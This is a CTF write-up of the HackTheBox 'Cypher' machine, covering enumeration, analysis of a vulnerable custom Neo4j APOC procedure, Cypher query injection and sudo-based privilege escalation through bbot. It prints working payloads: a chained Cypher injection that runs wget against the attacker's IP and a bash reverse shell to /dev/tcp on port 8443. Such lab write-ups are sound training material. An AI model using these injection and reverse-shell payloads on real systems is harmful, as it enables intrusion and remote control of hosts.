---
title: "HackTheBox Cypher Writeup"
date: 2025-07-25 18:00:00 +0000
layout: post
categories: [CTF, Writeup, HackTheBox]
tags: [HackTheBox, Cypher, Writeup, CTF, Neo4j, CypherInjection, QueryInjection, WebExploitation, CommandInjection, APOC, CustomProcedures, ReverseShell, PrivilegeEscalation, SudoMisconfiguration, BBot, LinuxPrivEsc, Nginx, DirectoryEnumeration, JARAnalysis]
description: "Enumeration and pwning the HackTheBox Cypher Box. Includes cypher query injection"
image: "/assets/images/SmileyCTF-babyrop/smileyCTF_pic.png"
---

## Enumeration

### Nmap

The nmap result shows the IP address as 10.10.11.57 and the hostname as cypher.htb

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMurODrr5ER4wj9mB2tWhXcLIcrm4Bo1lIEufLYIEBVY4h4ZROFj2+WFnXlGNqLG6ZB+DWQHRgG/6wg71wcElxA=
|   256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEqadcsjXAxI3uSmNBA8HUMR3L4lTaePj3o6vhgPuPTi
80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cypher.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Update `/etc/hosts` file

`10.10.11.57     cypher.htb`


### HTTP Enumeration

When visiting the page, the Graph ASM keyword was highlighted. I searched for this term, and the results primarily concerned visualizing assembly code using various frameworks or scripts.

![ff3cc7301726087e21832534261222ac.png](/assets/images/HTB-Cypher/ff3cc7301726087e21832534261222ac.png)

The web service utilizes nginx/1.24.0 (Ubuntu). This can be confirmed through an Nmap scan or by consulting [0xdf's 404 Cheatsheet](https://0xdf.gitlab.io/cheatsheets/404) 

![8a9e3364e39652fe2fc7f50f60e2e93c.png](/assets/images/HTB-Cypher/8a9e3364e39652fe2fc7f50f60e2e93c.png)

The web service has login functionality. Tried default credentials but no luck.

![8ab32ec131b77df07c9826d6219b8451.png](/assets/images/HTB-Cypher/8ab32ec131b77df07c9826d6219b8451.png)

When examining the page source of the login page, a JavaScript method was found, which included a comment that leaked the database type as Neo4j.

![fa1b8f4fc46e9eb458f204d856bd1b03.png](/assets/images/HTB-Cypher/fa1b8f4fc46e9eb458f204d856bd1b03.png)

The `doLogin` function verifies usernames and passwords through the `/api/auth/` endpoint. Notably, no sanitization is implemented within this function.

### Directory Enumeration

`ffuf -u http://cypher.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

![08eacea1ec56f408298860348b1d56ea.png](/assets/images/HTB-Cypher/08eacea1ec56f408298860348b1d56ea.png)

While enumerating directories, all endpoints were encountered except for the testing endpoint. This particular endpoint contains the `custom-apoc-extension-1.0-SNAPHOT.jar` file.

![71b9ccadd216a1ef00165b41a137fff2.png](/assets/images/HTB-Cypher/71b9ccadd216a1ef00165b41a137fff2.png)


## Jar File Analysis

The JAR file was developed for Neo4j, with the database version identified as 5.23.0. The artifactId within the JAR file indicates custom-apoc-extension. ^jar-file

![1e340301a61a8461e60264d57d0357c2.png](/assets/images/HTB-Cypher/1e340301a61a8461e60264d57d0357c2.png)

> What is APOC-Extension ?
> >APOC, which stands for **Awesome Procedures On Cypher**, is a highly popular and powerful **add-on library (or extension)** for the Neo4j graph database. It significantly extends the capabilities of Cypher, Neo4j's query language, by providing hundreds of additional procedures and functions.

#### Command Injection Vulnerability 

When I examine `getUrlStatusCode` method inside of `com.cypher.neo4j.apoc` The method parsing URL and than making curl request via exec method. The argument of exec method is `url` 

No sanitization made and directly passing into exec. It seems command injection vulnerability we have here. ^command-injection-vulnerability

![e72ccc82ac60605f2a154e1aa86f3d68.png](/assets/images/HTB-Cypher/e72ccc82ac60605f2a154e1aa86f3d68.png)

>What do we have ?
>> Neo4j Database with 5.23.0 version
>> Command injection vulnerability in getUrlStatusCode method.
>> No sanitization made username and password field in front-end. The webservice vulnerable cypher-query-injection ?

At this point only question remains needs to an answer. Lets find out.

## Cypher Query Injection

Cypher injection is like any other known database (mysql, mssql, sqlite etc. etc.) injection. The only difference the query language different. 

**Payload:** `test' //` 

![d30659162426a60cc329526ffa87f434.png](/assets/images/HTB-Cypher/d30659162426a60cc329526ffa87f434.png)

The application's logic resides in app.py, and the full Cypher query is revealed in error messages. For those unfamiliar with Cypher injection, here is a practical guide: [article](https://hackmd.io/@Chivato/rkAN7Q9NY) about the cypher injection.

**Full Query:** MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = 'test'{PAYLOAD} //' return h.value as hash"

### Building injection query


**Injected Query:** "test' OR 1=1 WITH 1 AS x CALL custom.getUrlStatusCode(\"http://10.10.14.13:8000/helloWorld\") YIELD statusCode AS y RETURN y as hash //" ^trigger-custom-procedure-call

Let's break down the query:

' OR 1=1 WITH 1 AS x: This segment uses a simple logical operation as a filler and then assigns the value 1 to the variable x using a WITH clause.

CALL custom.getUrlStatusCode(\"http://10.10.14.13:8000/helloWorld\") YIELD statusCode: This invokes the custom.getUrlStatusCode procedure, which was discovered during the JAR file analysis. The query specifies YIELD statusCode, indicating that the output variable for the status code is named statusCode.

AS y RETURN y AS hash: In this final part, the value yielded as statusCode is assigned to y, and then y is returned as hash.

![4ab7d62e5d2dfcde08c04951bcc9cf0c.png](/assets/images/HTB-Cypher/4ab7d62e5d2dfcde08c04951bcc9cf0c.png)



## Command Injection Attack

After executing the [getUrlStatusCode custom procedure call](#jar-file-analysis).
All we have to do is verifying the [command injection vulnerability](#command-injection-vulnerability)

The screenshot below is verifying the command injection works as expected.

The payload: **test' OR 1=1 WITH 1 AS x CALL custom.getUrlStatusCode(\"http://10.10.14.13:8000/helloWorld;wget http://10.10.14.13:8000/commandinjected\") YIELD statusCode AS y RETURN y as hash //**

![aff64090b7083bd455c76d3202bdd9f7.png](/assets/images/HTB-Cypher/aff64090b7083bd455c76d3202bdd9f7.png)

### Reverse Shell

Payload: **test' OR 1=1 WITH 1 AS x CALL custom.getUrlStatusCode(\"http://10.10.14.13:8000/helloWorld;bash -c 'bash -i >& /dev/tcp/10.10.14.13/8443 0>&1'\") YIELD statusCode AS y RETURN y as hash //**

![6bd4a0372389d3566fc151c65b101159.png](/assets/images/HTB-Cypher/6bd4a0372389d3566fc151c65b101159.png)

Switching full tty shell

![ead795ec488b292280f019798b670d29.png](/assets/images/HTB-Cypher/ead795ec488b292280f019798b670d29.png)

Generally in HTB environment `.bash_history` is linked to `/dev/null` When i look the neo4j user home directory the `.bash_history` is not empty and didn't linked to `/dev/null`

![5cf125974064afab9a8c3b28ddacc46d.png](/assets/images/HTB-Cypher/5cf125974064afab9a8c3b28ddacc46d.png)

The password in `.bash_history` is the password of `graphasm` user. Found by spraying the password for the users.

![e828f01b331995cc9e22162504a4948b.png](/assets/images/HTB-Cypher/e828f01b331995cc9e22162504a4948b.png)

When I gained access as a user on the system, I typically execute `sudo -l` in a Linux environment or `whoami /priv` in a Windows environment to check for privilege escalation opportunities.

```bash
graphasm@cypher:~$ sudo -l
Matching Defaults entries for graphasm on cypher:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User graphasm may run the following commands on cypher:
    (ALL) NOPASSWD: /usr/local/bin/bbot
graphasm@cypher:~$ 
```

When i executed the binary detailed help menu displayed.

![bfc87d63e5686732eebe447cfb0ec66e.png](/assets/images/HTB-Cypher/bfc87d63e5686732eebe447cfb0ec66e.png)

When I list the modules, find out reference link for the binary.

[https://www.blacklanternsecurity.com/bbot/Stable](https://www.blacklanternsecurity.com/bbot/Stable)

![2a37debbdad96087d20933b0eb4cc0ce.png](/assets/images/HTB-Cypher/2a37debbdad96087d20933b0eb4cc0ce.png)

BBOT is osint tool for multipurpose usage (enumeration, vulnerability scanning etc. etc.). Seems like every bugbounty hunter should've in toolset. Looks promising tool. 

![1dac47de467313826fd568b4655c58be.png](/assets/images/HTB-Cypher/1dac47de467313826fd568b4655c58be.png)

After some googling stuff and github digging `label:bug` in repository.

Encountered [https://seclists.org/fulldisclosure/2025/Apr/19](https://seclists.org/fulldisclosure/2025/Apr/19) vulnerability.

### Privilege Escalation

[https://github.com/Housma/bbot-privesc](https://github.com/Housma/bbot-privesc)

Following PoC steps lead to root privileges in the box.

![7c7cc03e56b81e330368f012e41accbc.png](/assets/images/HTB-Cypher/7c7cc03e56b81e330368f012e41accbc.png)

